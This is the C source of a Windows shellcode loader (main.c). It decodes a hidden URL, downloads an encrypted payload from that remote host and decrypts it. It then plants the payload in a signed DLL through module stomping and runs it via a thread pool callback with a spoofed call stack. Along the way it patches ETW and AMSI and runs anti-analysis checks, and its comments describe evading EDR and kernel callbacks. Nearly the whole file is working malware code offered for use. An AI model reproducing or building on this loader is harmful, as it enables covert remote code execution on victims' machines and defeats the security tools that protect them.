// =============================================
// main.c - Shellcode Loader
//
// Execution: Module Stomping + Thread Pool Callback + Call Stack Spoofing
// Memory:    Shellcode planted in signed DLL .text section
// Thread:    No NtCreateThreadEx — uses TpAllocWork/TpPostWork (reuses existing threads)
// Stack:     SpoofCallback tail-call preserves clean ntdll thread pool frames
// =============================================

#include "Common.h"

// Instantiate encoded data (auto-generated in Payload.h)
static unsigned char EncodedUrl[] = INIT_ENCODED_URL;
static unsigned char ProtectedKey[] = INIT_PROTECTED_KEY;

// -----------------------------------------------
// Decode XOR-encoded URL string at runtime
// -----------------------------------------------
static VOID DecodeUrl(OUT PCHAR pOut, IN PBYTE pEncoded, IN DWORD dwLen, IN BYTE bKey) {
    for (DWORD i = 0; i < dwLen; i++)
        pOut[i] = (CHAR)(pEncoded[i] ^ bKey);
}

// -----------------------------------------------
// Entry Point
// -----------------------------------------------
int Main(VOID) {

    NTAPI_FUNC  NtApis  = { 0 };
    API_HASHING WinApis = { 0 };
    NTSTATUS    STATUS  = 0x00;

    IatCamouflage();

#ifndef DEBUG
    if (!AntiAnalysis())
        return 0;
#endif

    if (!InitializeNtSyscalls(&NtApis))
        return 0;

    if (!InitializeWinApis(&WinApis))
        return 0;

    PatchEtw(&WinApis);
    PatchAmsi(&WinApis);

    // Key recovery
    PBYTE pRealKey = NULL;
    if (!BruteForceDecryption(HINT_BYTE, ProtectedKey, KEY_SIZE, &pRealKey))
        return 0;

    // Load encrypted payload
    PBYTE pPayload = NULL;
    DWORD dwPayloadSize = 0;

    // Decode URL and download
    CHAR szUrl[512] = { 0 };
    DecodeUrl(szUrl, EncodedUrl, URL_LENGTH, URL_XOR_KEY);
    LOG("[*] Downloading payload...");
    if (!DownloadPayload(&WinApis, szUrl, &pPayload, &dwPayloadSize)) {
        HeapFree(GetProcessHeap(), 0, pRealKey);
        return 0;
    }
    // Wipe URL from stack
    MemSet(szUrl, 0, sizeof(szUrl));
    LOG("[+] Payload loaded");

    // Decrypt
    if (!Rc4DecryptPayload(&WinApis, pPayload, dwPayloadSize, pRealKey, KEY_SIZE)) {
        HeapFree(GetProcessHeap(), 0, pPayload);
        HeapFree(GetProcessHeap(), 0, pRealKey);
        return 0;
    }
    MemSet(pRealKey, 0, KEY_SIZE);
    HeapFree(GetProcessHeap(), 0, pRealKey);

    // ============================================================
    // Stage 1: Module Stomping
    // Try to plant shellcode in a legitimate DLL's .text section.
    // If shellcode fits, execution memory is attributed to a
    // signed Windows DLL — EDR memory scans see a legit module.
    // Falls back to NtAllocateVirtualMemory if too large.
    // ============================================================
    PVOID pExec = NULL;
    BOOL  bStomped = ModuleStomp(&WinApis, pPayload, dwPayloadSize, &pExec);

    if (!bStomped) {
        LOG("[*] Module stomp failed, fallback to NtAllocateVirtualMemory");

        // Allocate RW memory via indirect syscall
        SIZE_T sRegion = (SIZE_T)dwPayloadSize;

        SET_SYSCALL(NtApis.NtAllocateVirtualMemory);
        STATUS = RunSyscall(
            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pExec,
            (ULONG_PTR)0, (ULONG_PTR)&sRegion,
            (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
            0, 0, 0, 0, 0, 0
        );
        if (!NT_SUCCESS(STATUS)) {
            HeapFree(GetProcessHeap(), 0, pPayload);
            return 0;
        }

        // Copy shellcode
        MemCopy(pExec, pPayload, dwPayloadSize);

        // RW -> RWX (RWX for Go-based shellcode that writes to own pages)
        ULONG   dwOldProt  = 0;
        SIZE_T  sProtSize  = (SIZE_T)dwPayloadSize;
        PVOID   pProtAddr  = pExec;

        SET_SYSCALL(NtApis.NtProtectVirtualMemory);
        STATUS = RunSyscall(
            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pProtAddr,
            (ULONG_PTR)&sProtSize, (ULONG_PTR)PAGE_EXECUTE_READWRITE,
            (ULONG_PTR)&dwOldProt,
            0, 0, 0, 0, 0, 0, 0
        );
        if (!NT_SUCCESS(STATUS)) {
            HeapFree(GetProcessHeap(), 0, pPayload);
            return 0;
        }
    }

    // Wipe original payload from heap
    MemSet(pPayload, 0, dwPayloadSize);
    HeapFree(GetProcessHeap(), 0, pPayload);

    // ============================================================
    // Stage 2: Call Stack Spoofing + Callback Execution
    //
    // Instead of NtCreateThreadEx (triggers PsSetCreateThreadNotifyRoutine
    // kernel callback), we execute via the Windows Thread Pool.
    //
    // TpAllocWork + TpPostWork dispatch work to an EXISTING thread pool
    // thread — no new thread is created, so the kernel thread-creation
    // callback never fires.
    //
    // SpoofCallback (ASM) is the thread pool callback wrapper. It uses
    // a tail-call (JMP, not CALL) to the shellcode, so no new stack
    // frame is created. The resulting call stack is:
    //
    //   shellcode RIP  (in stomped DLL .text = legitimate module)
    //   -> TppWorkpExecute     (ntdll)
    //   -> TppWorkerThread     (ntdll)
    //   -> RtlUserThreadStart  (ntdll)
    //
    // All frames are clean ntdll internals. No trace of the loader.
    // ============================================================

    // Store shellcode address for the ASM callback wrapper
    SetSpoofTarget(pExec);

    // Resolve thread pool functions from ntdll (hash-based, no strings)
    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = (PVOID)WinApis.pGetModuleHandleA((LPCSTR)xNtdll);
    if (!pNtdll)
        return 0;

    fnTpAllocWork  pTpAllocWork  = (fnTpAllocWork)FetchExportAddress(pNtdll, TpAllocWork_JOAAT);
    fnTpPostWork   pTpPostWork   = (fnTpPostWork)FetchExportAddress(pNtdll, TpPostWork_JOAAT);

    if (!pTpAllocWork || !pTpPostWork)
        return 0;

    // Create thread pool work item with SpoofCallback as the callback
    PVOID pWork = NULL;
    STATUS = pTpAllocWork(&pWork, (PVOID)SpoofCallback, NULL, NULL);
    if (!NT_SUCCESS(STATUS) || !pWork)
        return 0;

    LOG("[*] Executing via thread pool callback (spoofed stack)...");

    // Post work — triggers SpoofCallback on a thread pool thread
    pTpPostWork(pWork);

    // Keep process alive with infinite delay (indirect syscall)
    // NtDelayExecution avoids any kernel32 dependency for the wait
    LARGE_INTEGER li;
    li.QuadPart = -315360000000000LL; // ~1 year in 100ns units
    while (TRUE) {
        SET_SYSCALL(NtApis.NtDelayExecution);
        RunSyscall(
            (ULONG_PTR)FALSE, (ULONG_PTR)&li,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        );
    }

    return 0;
}
